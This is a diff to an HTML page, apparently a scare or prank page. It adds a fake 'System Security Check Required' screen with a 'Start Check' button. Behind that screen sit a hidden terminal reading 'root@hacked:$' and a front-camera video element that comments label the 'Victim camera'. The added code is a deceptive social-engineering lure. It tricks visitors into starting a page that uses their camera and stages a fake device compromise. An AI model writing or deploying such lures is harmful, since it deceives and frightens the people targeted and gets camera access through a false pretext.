@@ -8,7 +8,14 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div id="terminal">
+    <!-- Fake start screen -->
+    <div id="startScreen">
+        <h1>System Security Check Required</h1>
+        <p>Tap the button below to verify your device security.</p>
+        <button id="startBtn">Start Check</button>
+    </div>
+
+    <div id="terminal" style="display: none;">
         <div id="logs"></div>
         <div id="input-line">
             <span id="prompt">root@hacked:$ </span>
@@ -16,10 +23,10 @@
         </div>
     </div>
 
-    <!-- Victim's front camera feed (scary overlay) -->
+    <!-- Victim camera -->
     <video id="victimCam" autoplay playsinline muted></video>
 
-    <!-- Sounds (free reliable links) -->
+    <!-- Sounds -->
     <audio id="typingSound" loop>
         <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_9b6a4d9b9e.mp3?filename=keyboard-typing-1-12411.mp3" type="audio/mpeg">
     </audio>
